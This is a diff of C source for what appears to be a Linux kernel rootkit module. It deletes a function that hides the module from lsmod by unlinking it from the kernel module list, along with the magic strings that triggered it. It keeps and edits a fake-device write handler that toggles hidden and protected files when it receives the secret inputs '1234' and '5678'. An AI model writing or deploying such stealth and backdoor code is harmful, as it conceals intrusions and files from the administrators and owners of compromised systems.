@@ -3,14 +3,6 @@
 
 MODULE_LICENSE("GPL");
 
-void module_hide(void)
-{
-    module_previous = THIS_MODULE->list.prev;
-    list_del(&THIS_MODULE->list);
-    module_hidden = 1;
-}
-
-
 
 int fake_open(struct inode * inode, struct file * filp)
 {
@@ -40,31 +32,12 @@ ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
     if(copy_from_user(message,buf,127)!=0)
         return EFAULT;
 
-    /* if detect the secret string in device input, show module at lsmod. */
-    if(strstr(message,"Shazam")!=NULL)
-    {
-        if(module_hidden==1)
-        {
-            list_add(&THIS_MODULE->list, module_previous);
-            module_hidden = 0;
-        }
-    }
-
-    /*	If detect Shazam string in fake device IO turn module invisible to lsmod  */
-    if(strstr(message,"AbraKadabra")!=NULL)
-    {
-        if(module_hidden==0)
-            module_hide();
-    }
-
-    /*	If detect hocuspocus string in fake device IO turn module invisible to lsmod  */
-    if(strstr(message,"Alakazam")!=NULL)
+    if(strstr(message, "1234")!=NULL)
     {
         fs_hidden = fs_hidden?0:1;
     }
 
-    /*	If detect hocuspocus string in fake device IO turn module invisible to lsmod  */
-    if(strstr(message,"Sesame")!=NULL)
+    if(strstr(message, "5678")!=NULL)
     {
         fs_protect = fs_protect?0:1;
     }
@@ -78,11 +51,6 @@ ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
 _Bool check_fs_blocklist(char *input)
 {
     int i = 0;
-    // DMSG("PROTECTED FILES count %d", protected_index);
-    // for (int k = 0; k < protected_index; k++)
-    // {
-    //     DMSG("%d file = %s", k, protected_files[k]);
-    // }
 
     if (fs_protect==0)
         return 0;
@@ -105,15 +73,6 @@ _Bool check_fs_blocklist(char *input)
 _Bool check_fs_hidelist(char *input)
 {
     int i = 0;
-    // DMSG("HIDDEN FILES count %d", hidden_index);
-    // for (int k = 0; k < hidden_index; k++)
-    // {
-    //     DMSG("%d file = %s", k, hidden_files[k]);
-    // }
-    // const char *list[] = {
-    //     "hidden.txt"
-    // };
-
     if (fs_hidden==0)
         return 0;
 
